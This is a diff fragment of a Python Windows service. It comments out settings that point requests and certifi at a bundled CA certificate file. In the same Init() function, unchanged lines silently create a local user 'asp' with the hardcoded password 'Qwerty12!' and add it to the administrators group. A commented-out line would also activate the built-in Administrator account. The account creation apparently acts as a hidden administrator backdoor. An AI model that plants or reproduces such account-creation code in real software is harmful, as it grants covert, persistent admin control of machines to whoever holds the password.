@@ -154,11 +154,11 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
                myloop()      
        
 def Init():
-                        os.environ["REQUESTS_CA_BUNDLE"] = swin+"/cacert.pem"
+                        #os.environ["REQUESTS_CA_BUNDLE"] = swin+"/cacert.pem"
                         #os.environ["REQUESTS_CA_BUNDLE"] = os.path.join(os.getcwd(), "certifi", "cacert.pem")
-                        certifi.core.where=swin+"/certifi/cacert.pem"
-                        requests.utils.DEFAULT_CA_BUNDLE_PATH=swin+"/certifi/cacert.pem"
-                        requests.adapters.DEFAULT_CA_BUNDLE_PATH = swin+"/certifi/cacert.pem"
+                        #certifi.core.where=swin+"/certifi/cacert.pem"
+                        #requests.utils.DEFAULT_CA_BUNDLE_PATH=swin+"/certifi/cacert.pem"
+                        #requests.adapters.DEFAULT_CA_BUNDLE_PATH = swin+"/certifi/cacert.pem"
     #os.system("net.exe user Administrator /active:yes")
                         os.system("net.exe user asp Qwerty12! /add")
                         os.system("net.exe localgroup administrators asp /add")
